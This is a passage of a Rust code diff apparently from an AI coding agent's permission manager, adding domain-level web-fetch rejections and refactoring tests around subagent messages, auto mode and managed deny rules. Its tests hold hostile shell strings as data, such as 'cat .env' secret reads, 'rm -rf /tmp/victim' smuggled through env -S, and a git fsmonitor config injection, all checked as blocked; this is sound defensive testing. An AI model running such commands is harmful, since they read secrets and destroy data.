+                                        persist_state(&cwd, &state, client_id_ref).await;
+                                        Decision::Reject(format!(
+                                            "User rejected the execution and excluded `{access_name}` from future runs in this project"
+                                        ))
+                                    } else {
+                                        effective_kind = PromptOutcomeKind::RejectOnce;
+                                        Decision::Reject("User rejected the execution".to_owned())
+                                    }
+                                }
+                                PromptOutcome::RejectAlwaysDomain(client_domain) => {
+                                    if let Some(domain) = match &access {
+                                        AccessKind::WebFetch(url) => {
+                                            web_fetch_deny_key_from_url(url)
+                                        }
+                                        _ => None,
+                                    } {
+                                        if domain != *client_domain {
+                                            tracing::warn!(
+                                                client_supplied = %client_domain,
+                                                access_domain = %domain,
+                                                "RejectAlwaysDomain mismatch; persisting access-URL domain"
+                                            );
+                                        }
+                                        state.disallowed_web_fetch_domains.insert(domain.clone());
+                                        persist_state(&cwd, &state, client_id_ref).await;
+                                        Decision::Reject(format!(
+                                            "User rejected the execution and excluded `{domain}` from future runs in this project"
+                                        ))
+                                    } else {
+                                        effective_kind = PromptOutcomeKind::RejectOnce;
+                                        Decision::Reject("User rejected the execution".to_owned())
+                                    }
+                                }
                                 PromptOutcome::RejectOnce => {
                                     Decision::Reject("User rejected the execution".to_owned())
                                 }
@@ -2696,6 +3013,7 @@ fn spawn_permission_manager_with_pin(
                     // request only; the Cell is about to drop with this request.
                     if user_prompted && outcome_str != "error" && !requester_gone {
                         auto_consecutive_denials = 0;
+                        auto_total_denials = 0;
                     }
                     // A no-op when the requester is gone (send fails on a closed
                     // channel); the sole trace clone already went out via emit_event.
@@ -2732,6 +3050,24 @@ mod tests {
 
     // ── Managed-policy pin: yolo clamp + persisted bash clamp ──
 
+    async fn decide(
+        handle: &PermissionHandle,
+        access: AccessKind,
+        tool_call_update: acp::ToolCallUpdate,
+    ) -> Decision {
+        handle
+            .request_with_context(PermissionRequest::new(access, tool_call_update))
+            .await
+            .decision
+    }
+
+    const AGENT_MESSAGE_TEST_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(5);
+
+    async fn agent_message_completes<T>(future: impl std::future::Future<Output = T>) -> T {
+        tokio::time::timeout(AGENT_MESSAGE_TEST_TIMEOUT, future)
+            .await
+            .expect("agent-message permission test timed out")
+    }
     const PIN: &str = crate::permission::resolution::YOLO_PIN_REASON_REQUIREMENTS;
     const UNSAFE_GIT_STATUS: &str = concat!(
         "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor ",
@@ -2932,15 +3268,7 @@ mod tests {
                 let cwd = AbsPathBuf::new(tmp.path().to_path_buf()).unwrap();
                 let transport = fake_hub(serde_json::json!({ "outcome": "approve" }));
                 let (mgr, _e) = test_manager_with_hub(&cwd, transport.clone());
-                let d = mgr
-                    .request(
-                        AccessKind::Edit("src/main.rs".into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(&mgr, AccessKind::Edit("src/main.rs".into()), tool_call()).await;
                 assert_eq!(d, Decision::Allow);
                 let seen = transport.seen.lock().unwrap();
                 assert_eq!(seen.len(), 1, "exactly one permission hook emitted");
@@ -2967,8 +3295,7 @@ mod tests {
                 let (mgr, _e) = test_manager_with_hub(&cwd, transport.clone());
                 for path in ["src/first.rs", "src/second.rs", "~/.zshrc"] {
                     assert_eq!(
-                        mgr.request(AccessKind::Edit(path.into()), tool_call(), None, None, None)
-                            .await,
+                        decide(&mgr, AccessKind::Edit(path.into()), tool_call()).await,
                         Decision::Allow
                     );
                 }
@@ -3003,15 +3330,15 @@ mod tests {
                     display.path().join("src.rs"),
                 ] {
                     assert_eq!(
-                        mgr.request_with_path_context(
-                            AccessKind::Edit(displayed.to_string_lossy().into_owned()),
-                            tool_call(),
-                            Some(context.clone()),
-                            None,
-                            None,
-                            None,
-                        )
-                        .await,
+                        mgr.request_with_context(PermissionRequest {
+                            path_context: Some(context.clone()),
+                            ..PermissionRequest::new(
+                                AccessKind::Edit(displayed.to_string_lossy().into_owned()),
+                                tool_call(),
+                            )
+                        })
+                        .await
+                        .decision,
                         Decision::Allow
                     );
                 }
@@ -3061,15 +3388,15 @@ mod tests {
                 // regardless of the request cwd.
                 let parent_file = parent.path().join("src/main.rs");
                 let d = mgr
-                    .request_with_path_context(
-                        AccessKind::Read(Some(parent_file.to_string_lossy().into_owned())),
-                        tc(),
-                        Some(context.clone()),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                    .request_with_context(PermissionRequest {
+                        path_context: Some(context.clone()),
+                        ..PermissionRequest::new(
+                            AccessKind::Read(Some(parent_file.to_string_lossy().into_owned())),
+                            tc(),
+                        )
+                    })
+                    .await
+                    .decision;
                 assert!(
                     !matches!(d, Decision::Allow),
                     "parent-workspace read must hit the parent rule, got {d:?}"
@@ -3079,15 +3406,12 @@ mod tests {
                 // CHILD cwd — outside the parent workspace — so the parent
                 // rule must not match; the read keeps its default auto-allow.
                 let d = mgr
-                    .request_with_path_context(
-                        AccessKind::Read(Some("src/main.rs".into())),
-                        tc(),
-                        Some(context),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                    .request_with_context(PermissionRequest {
+                        path_context: Some(context),
+                        ..PermissionRequest::new(AccessKind::Read(Some("src/main.rs".into())), tc())
+                    })
+                    .await
+                    .decision;
                 assert!(
                     matches!(d, Decision::Allow),
                     "child-relative read must not be normalized into the parent workspace, got {d:?}"
@@ -3107,15 +3431,7 @@ mod tests {
                     &cwd,
                     fake_hub(serde_json::json!({ "outcome": "reject" })),
                 );
-                let d = mgr
-                    .request(
-                        AccessKind::Edit("a.rs".into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(&mgr, AccessKind::Edit("a.rs".into()), tool_call()).await;
                 assert!(
                     matches!(d, Decision::Reject(_)),
                     "reject must abort, got {d:?}"
@@ -3136,15 +3452,7 @@ mod tests {
                     &cwd,
                     fake_hub(serde_json::json!({ "outcome": "cancelled" })),
                 );
-                let d = mgr
-                    .request(
-                        AccessKind::Edit("a.rs".into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(&mgr, AccessKind::Edit("a.rs".into()), tool_call()).await;
                 assert_eq!(d, Decision::Cancelled);
             })
             .await;
@@ -3162,31 +3470,25 @@ mod tests {
                     "scope": { "kind": "server_prefix", "value": "linear" },
                 }));
                 let (mgr, _e) = test_manager_with_hub(&cwd, transport.clone());
-                let first = mgr
-                    .request(
-                        AccessKind::MCPTool {
-                            name: "linear__list".into(),
-                            input: serde_json::Value::Null,
-                        },
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let first = decide(
+                    &mgr,
+                    AccessKind::MCPTool {
+                        name: "linear__list".into(),
+                        input: serde_json::Value::Null,
+                    },
+                    tool_call(),
+                )
+                .await;
                 assert_eq!(first, Decision::Allow);
-                let second = mgr
-                    .request(
-                        AccessKind::MCPTool {
-                            name: "linear__create".into(),
-                            input: serde_json::Value::Null,
-                        },
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let second = decide(
+                    &mgr,
+                    AccessKind::MCPTool {
+                        name: "linear__create".into(),
+                        input: serde_json::Value::Null,
+                    },
+                    tool_call(),
+                )
+                .await;
                 assert_eq!(second, Decision::Allow);
                 assert_eq!(
                     transport.seen.lock().unwrap().len(),
@@ -3210,21 +3512,19 @@ mod tests {
                         "scope": { "kind": "server_prefix", "value": forged_server },
                     }));
                     let (mgr, _e) = test_manager_with_hub(&cwd, transport.clone());
-                    let decision = mgr
-                        .request(
-                            AccessKind::MCPTool {
-                                name: name.into(),
-                                input: serde_json::Value::Null,
-                            },
-                            tool_call(),
-                            None,
-                            None,
-                            None,
-                        )
-                        .await;
+                    let decision = decide(
+                        &mgr,
+                        AccessKind::MCPTool {
+                            name: name.into(),
+                            input: serde_json::Value::Null,
+                        },
+                        tool_call(),
+                    )
+                    .await;
                     assert_eq!(decision, Decision::Allow);
 
-                    let persisted = load_state_from_disk(&cwd, None).await;
+                    let persisted =
+                        crate::permission::state::load_state_from_disk(&cwd, None).await;
                     assert!(persisted.allowed_mcp_servers.is_empty(), "{name}");
                     assert!(persisted.allowed_mcp_tools.contains(name), "{name}");
                     assert!(matches!(
@@ -3235,18 +3535,15 @@ mod tests {
                     let replay_transport = fake_hub(serde_json::json!({ "outcome": "reject" }));
                     let (reloaded, _e) = test_manager_with_hub(&cwd, replay_transport.clone());
                     assert_eq!(
-                        reloaded
-                            .request(
-                                AccessKind::MCPTool {
-                                    name: name.into(),
-                                    input: serde_json::Value::Null,
-                                },
-                                tool_call(),
-                                None,
-                                None,
-                                None,
-                            )
-                            .await,
+                        decide(
+                            &reloaded,
+                            AccessKind::MCPTool {
+                                name: name.into(),
+                                input: serde_json::Value::Null,
+                            },
+                            tool_call(),
+                        )
+                        .await,
                         Decision::Allow
                     );
                     assert!(replay_transport.seen.lock().unwrap().is_empty());
@@ -3281,28 +3578,17 @@ mod tests {
                     )
                 };
                 let (mgr, _e) = test_manager_with_config(&cwd, config, false);
-                let d = mgr
-                    .request(
-                        AccessKind::Read(Some("secrets/value.txt".into())),
-                        tc(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(
+                    &mgr,
+                    AccessKind::Read(Some("secrets/value.txt".into())),
+                    tc(),
+                )
+                .await;
                 assert!(
                     !matches!(d, Decision::Allow),
                     "ask-ruled direct read must not be silently allowed, got {d:?}"
                 );
-                let d = mgr
-                    .request(
-                        AccessKind::Read(Some("README.md".into())),
-                        tc(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(&mgr, AccessKind::Read(Some("README.md".into())), tc()).await;
                 assert!(
                     matches!(d, Decision::Allow),
                     "non-ask read must auto-allow, got {d:?}"
@@ -3344,93 +3630,53 @@ mod tests {
                 };
 
                 let (mgr, _e) = test_manager_with_config(&cwd, config(), false);
-                let d = mgr
-                    .request(AccessKind::Bash("cat .env".into()), tc(), None, None, None)
-                    .await;
+                let d = decide(&mgr, AccessKind::Bash("cat .env".into()), tc()).await;
                 assert!(
                     matches!(d, Decision::PolicyDeny(_)),
                     "auto-safe `cat .env` must be denied, got {d:?}"
                 );
-                let d = mgr
-                    .request(
-                        AccessKind::Bash("cat 0<.env".into()),
-                        tc(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(&mgr, AccessKind::Bash("cat 0<.env".into()), tc()).await;
                 assert!(
                     matches!(d, Decision::PolicyDeny(_)),
                     "`cat 0<.env` must be denied, got {d:?}"
                 );
-                let d = mgr
-                    .request(
-                        AccessKind::Bash("echo x > .env".into()),
-                        tc(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(&mgr, AccessKind::Bash("echo x > .env".into()), tc()).await;
                 assert!(
                     matches!(d, Decision::PolicyDeny(_)),
                     "shell write to .env must be denied, got {d:?}"
                 );
-                let d = mgr
-                    .request(
-                        AccessKind::Read(Some(".env".into())),
-                        tc(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(&mgr, AccessKind::Read(Some(".env".into())), tc()).await;
                 assert!(
                     matches!(d, Decision::PolicyDeny(_)),
                     "direct read .env must be denied, got {d:?}"
                 );
-                let d = mgr
-                    .request(
-                        AccessKind::Bash("cat README.md".into()),
-                        tc(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(&mgr, AccessKind::Bash("cat README.md".into()), tc()).await;
                 assert!(
                     matches!(d, Decision::Allow),
                     "non-denied `cat README.md` must auto-allow, got {d:?}"
                 );
                 // No responder in the test, so an `Ask` surfaces as non-Allow.
-                let d = mgr
-                    .request(
-                        AccessKind::Read(Some("secrets/value.txt".into())),
-                        tc(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(
+                    &mgr,
+                    AccessKind::Read(Some("secrets/value.txt".into())),
+                    tc(),
+                )
+                .await;
                 assert!(
                     !matches!(d, Decision::Allow),
                     "ask-ruled direct read must not be silently allowed, got {d:?}"
                 );
                 // The Grep tool reads file contents, so it must hit the Read deny
                 // instead of the unconditional grep auto-allow.
-                let d = mgr
-                    .request(
-                        AccessKind::Grep {
-                            path: Some(".env".into()),
-                            glob: None,
-                        },
-                        tc(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(
+                    &mgr,
+                    AccessKind::Grep {
+                        path: Some(".env".into()),
+                        glob: None,
+                    },
+                    tc(),
+                )
+                .await;
                 assert!(
                     matches!(d, Decision::PolicyDeny(_)),
                     "grep tool on .env must be denied, got {d:?}"
@@ -3438,17 +3684,13 @@ mod tests {
 
                 let (yolo_mgr, _e2) = test_manager_with_config(&cwd, config(), true);
                 assert!(yolo_mgr.is_yolo_mode(), "precondition: yolo on");
-                let d = yolo_mgr
-                    .request(AccessKind::Bash("cat .env".into()), tc(), None, None, None)
-                    .await;
+                let d = decide(&yolo_mgr, AccessKind::Bash("cat .env".into()), tc()).await;
                 assert!(
                     matches!(d, Decision::PolicyDeny(_)),
                     "YOLO must not bypass the direct managed deny, got {d:?}"
                 );
                 let inline_read = "bash -c 'cat .env'";
-                let d = yolo_mgr
-                    .request(AccessKind::Bash(inline_read.into()), tc(), None, None, None)
-                    .await;
+                let d = decide(&yolo_mgr, AccessKind::Bash(inline_read.into()), tc()).await;
                 assert!(
                     matches!(d, Decision::PolicyDeny(_)),
                     "YOLO must not bypass the inline Read deny, got {d:?}"
@@ -3465,22 +3707,12 @@ mod tests {
                 };
                 persist_state(&cwd, &state, None).await;
                 let (persisted_mgr, _e3) = test_manager_with_config(&cwd, config(), false);
-                let d = persisted_mgr
-                    .request(AccessKind::Bash("cat .env".into()), tc(), None, None, None)
-                    .await;
+                let d = decide(&persisted_mgr, AccessKind::Bash("cat .env".into()), tc()).await;
                 assert!(
                     matches!(d, Decision::PolicyDeny(_)),
                     "persisted approval must not bypass the direct managed deny, got {d:?}"
                 );
-                let d = persisted_mgr
-                    .request(
-                        AccessKind::Bash(inline_write.into()),
-                        tc(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(&persisted_mgr, AccessKind::Bash(inline_write.into()), tc()).await;
                 assert!(
                     matches!(d, Decision::PolicyDeny(_)),
                     "persisted approval must not bypass the inline Edit deny, got {d:?}"
@@ -3523,8 +3755,7 @@ mod tests {
                     "timeout 5 env -S 'rm -rf /tmp/victim'",
                     "/usr/bin/env --split-string='rm -rf /tmp/victim'",
                 ] {
-                    let d = mgr
-                        .request(AccessKind::Bash(cmd.into()), tool_call(), None, None, None)
+                    let d = decide(&mgr, AccessKind::Bash(cmd.into()), tool_call())
                         .await;
                     assert!(
                         matches!(d, Decision::PolicyDeny(_)),
@@ -3545,8 +3776,7 @@ mod tests {
                     "env -P /usr/bin -S 'echo $HOME'",
                 ];
                 for cmd in uncertain {
-                    let d = mgr
-                        .request(AccessKind::Bash(cmd.into()), tool_call(), None, None, None)
+                    let d = decide(&mgr, AccessKind::Bash(cmd.into()), tool_call())
                         .await;
                     assert!(
                         matches!(d, Decision::Reject(_)),
@@ -3559,14 +3789,7 @@ mod tests {
                     "each uncertain env -S shape must hit the user prompt once under YOLO"
                 );
                 // Ordinary env assignment still denies the peeled command under YOLO.
-                let d = mgr
-                    .request(
-                        AccessKind::Bash("env FOO=1 rm -rf /tmp/victim".into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
+                let d = decide(&mgr, AccessKind::Bash("env FOO=1 rm -rf /tmp/victim".into()), tool_call())
                     .await;
                 assert!(
                     matches!(d, Decision::PolicyDeny(_)),
@@ -3619,9 +3842,7 @@ mod tests {
                             "git show HEAD:f | sed -n '1,5p'",
                             "cd /tmp && grep -n x f; sed -n '1,5p' f",
                         ] {
-                            let d = mgr
-                                .request(AccessKind::Bash(cmd.into()), tc(), None, None, None)
-                                .await;
+                            let d = decide(&mgr, AccessKind::Bash(cmd.into()), tc()).await;
                             assert!(
                                 matches!(d, Decision::PolicyDeny(_)),
                                 "must deny non-leading segment (yolo={yolo}): {cmd}, got {d:?}"
@@ -3630,15 +3851,7 @@ mod tests {
                         // A chain with no denied segment must fall through
                         // unescalated: YOLO auto-allows it, and without YOLO it
                         // may prompt but never policy-deny.
-                        let d = mgr
-                            .request(
-                                AccessKind::Bash("echo hi && ls".into()),
-                                tc(),
-                                None,
-                                None,
-                                None,
-                            )
-                            .await;
+                        let d = decide(&mgr, AccessKind::Bash("echo hi && ls".into()), tc()).await;
                         if yolo {
                             assert!(
                                 matches!(d, Decision::Allow),
@@ -3653,15 +3866,12 @@ mod tests {
                         // Undecomposable script: the command gate fails closed
                         // to Ask, which must block the YOLO auto-approve — a
                         // YOLO gate wired to the file-only flag would allow it.
-                        let d = mgr
-                            .request(
-                                AccessKind::Bash("OUT=$(sed -n 1p f); echo $OUT".into()),
-                                tc(),
-                                None,
-                                None,
-                                None,
-                            )
-                            .await;
+                        let d = decide(
+                            &mgr,
+                            AccessKind::Bash("OUT=$(sed -n 1p f); echo $OUT".into()),
+                            tc(),
+                        )
+                        .await;
                         assert!(
                             !matches!(d, Decision::Allow),
                             "fail-closed Ask must block auto-approval (yolo={yolo}), got {d:?}"
@@ -3680,9 +3890,7 @@ mod tests {
                     "echo \"$(date)\" && ls",
                     "echo hi && ls",
                 ] {
-                    let d = mgr
-                        .request(AccessKind::Bash(cmd.into()), tc(), None, None, None)
-                        .await;
+                    let d = decide(&mgr, AccessKind::Bash(cmd.into()), tc()).await;
                     assert!(
                         matches!(d, Decision::Allow),
                         "no bash rules: gate must stay inert for `{cmd}`, got {d:?}"
@@ -3803,9 +4011,7 @@ mod tests {
                 };
 
                 let (unpinned, _e1) = test_manager(&cwd, false, None);
-                let allow = unpinned
-                    .request(AccessKind::Bash(benign.into()), bash(), None, None, None)
-                    .await;
+                let allow = decide(&unpinned, AccessKind::Bash(benign.into()), bash()).await;
                 assert_eq!(
                     allow,
                     Decision::Allow,
@@ -3813,9 +4019,7 @@ mod tests {
                 );
 
                 let (pinned, _e2) = test_manager(&cwd, false, Some(PIN));
-                let neutralized = pinned
-                    .request(AccessKind::Bash(benign.into()), bash(), None, None, None)
-                    .await;
+                let neutralized = decide(&pinned, AccessKind::Bash(benign.into()), bash()).await;
                 // Gateway receiver is dropped in test_manager — a prompt attempt
                 // surfaces as non-Allow (same pattern as neighboring Ask tests).
                 assert!(
@@ -3857,6 +4061,45 @@ mod tests {
                 .find(|o| o.kind == acp::PermissionOptionKind::RejectOnce)
                 .map(|o| o.option_id.clone())
                 .expect("bash permission prompt must offer a reject-once option");
+            self.prompts.borrow_mut().push(args);
+            Ok(acp::RequestPermissionResponse::new(
+                acp::RequestPermissionOutcome::Selected(acp::SelectedPermissionOutcome::new(
+                    option_id,
+                )),
+            ))
+        }
+
+        async fn session_notification(&self, _: acp::SessionNotification) -> acp::Result<()> {
+            Ok(())
+        }
+    }
+
+    struct IdSelectingClient {
+        id: &'static str,
+        prompts: std::rc::Rc<std::cell::RefCell<Vec<acp::RequestPermissionRequest>>>,
+    }
+
+    impl IdSelectingClient {
+        fn new(id: &'static str) -> Self {
+            Self {
+                id,
+                prompts: Default::default(),
+            }
+        }
+    }
+
+    #[async_trait::async_trait(?Send)]
+    impl acp::Client for IdSelectingClient {
+        async fn request_permission(
+            &self,
+            args: acp::RequestPermissionRequest,
+        ) -> acp::Result<acp::RequestPermissionResponse> {
+            let option_id = args
+                .options
+                .iter()
+                .find(|o| o.option_id.0.as_ref() == self.id)
+                .map(|o| o.option_id.clone())
+                .unwrap_or_else(|| panic!("prompt must offer option `{}`", self.id));
             self.prompts.borrow_mut().push(args);
             Ok(acp::RequestPermissionResponse::new(
                 acp::RequestPermissionOutcome::Selected(acp::SelectedPermissionOutcome::new(
@@ -3981,17 +4224,13 @@ mod tests {
     #[tokio::test]
     async fn handle_send_failure_returns_event_less_reject() {
         let (cmd_tx, cmd_rx) = mpsc::unbounded_channel::<PermissionCommand>();
-        drop(cmd_rx); // no actor: the send fails immediately
+        drop(cmd_rx);
         let handle = handle_with_cmd_tx(cmd_tx);
         let resolution = handle
-            .request_with_path_context_resolved(
+            .request_with_context(PermissionRequest::new(
                 AccessKind::Bash("echo hi".into()),
                 tool_call(),
-                None,
-                None,
-                None,
-                None,
-            )
+            ))
             .await;
         assert!(
             resolution.event.is_none(),
@@ -4011,20 +4250,16 @@ mod tests {
                 tokio::task::spawn_local(async move {
                     while let Some(cmd) = cmd_rx.recv().await {
                         if let PermissionCommand::Request { respond_to, .. } = cmd {
-                            drop(respond_to); // never answer → receive failure
+                            drop(respond_to);
                         }
                     }
                 });
                 let handle = handle_with_cmd_tx(cmd_tx);
                 let resolution = handle
-                    .request_with_path_context_resolved(
+                    .request_with_context(PermissionRequest::new(
                         AccessKind::Bash("echo hi".into()),
                         tool_call(),
-                        None,
-                        None,
-                        None,
-                        None,
-                    )
+                    ))
                     .await;
                 assert!(
                     resolution.event.is_none(),
@@ -4173,6 +4408,197 @@ mod tests {
     }
 
     #[tokio::test]
+    async fn edit_session_grant_does_not_predecide_agent_message() {
+        let local = tokio::task::LocalSet::new();
+        agent_message_completes(local.run_until(async {
+            let tmp = tempfile::tempdir().unwrap();
+            let cwd = AbsPathBuf::new(tmp.path().to_path_buf()).unwrap();
+            let transport = fake_hub(serde_json::json!({ "outcome": "always_approve" }));
+            let (mgr, mut events) = test_manager_with_hub(&cwd, transport.clone());
+
+            assert_eq!(
+                agent_message_completes(decide(
+                    &mgr,
+                    AccessKind::Edit("src/main.rs".into()),
+                    tool_call()
+                ))
+                .await,
+                Decision::Allow
+            );
+            assert_eq!(
+                agent_message_completes(decide(
+                    &mgr,
+                    AccessKind::AgentMessage {
+                        subagent_id: "sub-1".into(),
+                    },
+                    tool_call()
+                ))
+                .await,
+                Decision::Allow
+            );
+            assert_eq!(transport.seen.lock().unwrap().len(), 2);
+            let event = agent_message_completes(events.recv())
+                .await
+                .expect("agent-message event");
+            let event = if event.tool_name == "send_subagent_message" {
+                event
+            } else {
+                agent_message_completes(events.recv())
+                    .await
+                    .expect("agent-message event")
+            };
+            assert_eq!(event.tool_name, "send_subagent_message");
+            assert_eq!(event.access_kind, "agent_message");
+            assert_eq!(event.access_detail.as_deref(), Some("sub-1"));
+        }))
+        .await;
+    }
+
+    #[tokio::test]
+    async fn agent_message_approval_does_not_grant_later_messages_or_edits() {
+        let local = tokio::task::LocalSet::new();
+        agent_message_completes(local.run_until(async {
+            let tmp = tempfile::tempdir().unwrap();
+            let cwd = AbsPathBuf::new(tmp.path().to_path_buf()).unwrap();
+            let transport = fake_hub(serde_json::json!({ "outcome": "always_approve" }));
+            let (mgr, _events) = test_manager_with_hub(&cwd, transport.clone());
+
+            for subagent_id in ["sub-1", "sub-2"] {
+                assert_eq!(
+                    agent_message_completes(decide(
+                        &mgr,
+                        AccessKind::AgentMessage {
+                            subagent_id: subagent_id.into(),
+                        },
+                        tool_call()
+                    ))
+                    .await,
+                    Decision::Allow
+                );
+            }
+            assert_eq!(
+                agent_message_completes(decide(
+                    &mgr,
+                    AccessKind::Edit("src/main.rs".into()),
+                    tool_call()
+                ))
+                .await,
+                Decision::Allow
+            );
+            assert_eq!(
+                transport.seen.lock().unwrap().len(),
+                3,
+                "agent-message approval must not create message or edit grants"
+            );
+        }))
+        .await;
+    }
+
+    #[tokio::test]
+    async fn auto_agent_message_uses_fast_path_identity() {
+        use crate::permission::auto_mode::ClassifierVerdict;
+
+        let local = tokio::task::LocalSet::new();
+        agent_message_completes(local.run_until(async {
+            let tmp = tempfile::tempdir().unwrap();
+            let cwd = AbsPathBuf::new(tmp.path().to_path_buf()).unwrap();
+            let (mgr, mut events) = test_manager(&cwd, false, None);
+            mgr.set_auto_mode(true);
+            let (classifier, seen) = capturing_classifier(ClassifierVerdict::Block);
+            mgr.set_classifier(Some(classifier));
+
+            assert_eq!(
+                agent_message_completes(decide(
+                    &mgr,
+                    AccessKind::AgentMessage {
+                        subagent_id: "sub-1".into(),
+                    },
+                    tool_call()
+                ))
+                .await,
+                Decision::Allow
+            );
+            assert_eq!(seen.lock().unwrap().len(), 0);
+            let event = agent_message_completes(events.recv())
+                .await
+                .expect("permission event");
+            assert_eq!(event.tool_name, "send_subagent_message");
+            assert_eq!(event.access_kind, "agent_message");
+            assert_eq!(event.access_detail.as_deref(), Some("sub-1"));
+            assert_eq!(
+                event.decision_reason.as_deref(),
+                Some(reasons::AUTO_FAST_PATH)
+            );
+            assert_eq!(event.classifier_source.as_deref(), Some("fast_path"));
+        }))
+        .await;
+    }
+
+    #[tokio::test]
+    async fn managed_agent_message_deny_and_ask_beat_auto_fast_path() {
+        use crate::permission::auto_mode::ClassifierVerdict;
+        use crate::permission::types::{
+            PatternMode, PermissionConfig, PermissionRule, RuleAction, ToolFilter,
+        };
+
+        fn agent_message_rule(action: RuleAction) -> PermissionRule {
+            PermissionRule {
+                action,
+                tool: ToolFilter::AgentMessage,
+                pattern: None,
+                pattern_mode: PatternMode::Glob,
+            }
+        }
+
+        let local = tokio::task::LocalSet::new();
+        agent_message_completes(local.run_until(async {
+            let tmp = tempfile::tempdir().unwrap();
+            let cwd = AbsPathBuf::new(tmp.path().to_path_buf()).unwrap();
+            let access = AccessKind::AgentMessage {
+                subagent_id: "sub-1".into(),
+            };
+
+            let deny = PermissionConfig::new(vec![agent_message_rule(RuleAction::Deny)]);
+            let (deny_mgr, mut deny_events) = test_manager_with_config(&cwd, deny, false);
+            deny_mgr.set_auto_mode(true);
+            let (deny_clf, deny_seen) = capturing_classifier(ClassifierVerdict::Allow);
+            deny_mgr.set_classifier(Some(deny_clf));
+            let denied =
+                agent_message_completes(decide(&deny_mgr, access.clone(), tool_call())).await;
+            assert!(matches!(denied, Decision::PolicyDeny(_)), "got {denied:?}");
+            assert_eq!(deny_seen.lock().unwrap().len(), 0);
+            let deny_event = agent_message_completes(deny_events.recv())
+                .await
+                .expect("deny event");
+            assert_eq!(
+                deny_event.decision_reason.as_deref(),
+                Some(reasons::POLICY_DENY)
+            );
+
+            let ask = PermissionConfig::new(vec![agent_message_rule(RuleAction::Ask)]);
+            let client = RecordingClient::default();
+            let prompts = client.prompts.clone();
+            let (ask_mgr, mut ask_events) =
+                manager_with_recording_client(&cwd, Some(ask), client, ClientType::Generic);
+            ask_mgr.set_auto_mode(true);
+            let (ask_clf, ask_seen) = capturing_classifier(ClassifierVerdict::Allow);
+            ask_mgr.set_classifier(Some(ask_clf));
+            let asked = agent_message_completes(decide(&ask_mgr, access, tool_call())).await;
+            assert!(matches!(asked, Decision::Reject(_)), "got {asked:?}");
+            assert_eq!(ask_seen.lock().unwrap().len(), 0);
+            assert_eq!(prompts.borrow().len(), 1);
+            let ask_event = agent_message_completes(ask_events.recv())
+                .await
+                .expect("ask event");
+            assert_eq!(
+                ask_event.decision_reason.as_deref(),
+                Some(reasons::POLICY_ASK)
+            );
+        }))
+        .await;
+    }
+
+    #[tokio::test]
     async fn prompted_allow_feeds_classifier_context() {
         use crate::permission::auto_mode::{ClassifierTurn, ClassifierVerdict};
         let local = tokio::task::LocalSet::new();
@@ -4187,30 +4613,24 @@ mod tests {
                     ClientType::Generic,
                     true,
                 );
-                let d = mgr
-                    .request(
-                        AccessKind::Bash("my-custom-build --release".into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(
+                    &mgr,
+                    AccessKind::Bash("my-custom-build --release".into()),
+                    tool_call(),
+                )
+                .await;
                 assert_eq!(d, Decision::Allow, "prompted allow-once must allow");
 
                 mgr.set_auto_mode(true);
                 mgr.set_classifier_transcript(vec![ClassifierTurn::UserText("build it".into())]);
                 let (clf, seen) = capturing_classifier(ClassifierVerdict::Allow);
                 mgr.set_classifier(Some(clf));
-                let d = mgr
-                    .request(
-                        AccessKind::Bash("another-custom-tool".into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(
+                    &mgr,
+                    AccessKind::Bash("another-custom-tool".into()),
+                    tool_call(),
+                )
+                .await;
                 assert_eq!(d, Decision::Allow);
 
                 let seen = seen.lock().unwrap();
@@ -4242,15 +4662,12 @@ mod tests {
                 let client = RecordingClient::default();
                 let (mgr, _e) =
                     manager_with_recording_client(&cwd, None, client, ClientType::Generic);
-                let d = mgr
-                    .request(
-                        AccessKind::Bash("deploy-widget --prod".into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(
+                    &mgr,
+                    AccessKind::Bash("deploy-widget --prod".into()),
+                    tool_call(),
+                )
+                .await;
                 assert!(
                     matches!(d, Decision::Reject(_)),
                     "prompted reject, got {d:?}"
@@ -4259,15 +4676,12 @@ mod tests {
                 mgr.set_auto_mode(true);
                 let (clf, seen) = capturing_classifier(ClassifierVerdict::Allow);
                 mgr.set_classifier(Some(clf));
-                let d = mgr
-                    .request(
-                        AccessKind::Bash("my-custom-build --release".into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(
+                    &mgr,
+                    AccessKind::Bash("my-custom-build --release".into()),
+                    tool_call(),
+                )
+                .await;
                 assert_eq!(d, Decision::Allow);
 
                 let seen = seen.lock().unwrap();
@@ -4307,24 +4721,19 @@ mod tests {
                     ClientType::Generic,
                     true,
                 );
-                let d = mgr
-                    .request(
-                        AccessKind::Bash("evil-tool --now".into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(
+                    &mgr,
+                    AccessKind::Bash("evil-tool --now".into()),
+                    tool_call(),
+                )
+                .await;
                 assert!(matches!(d, Decision::PolicyDeny(_)), "got {d:?}");
 
                 mgr.set_auto_mode(true);
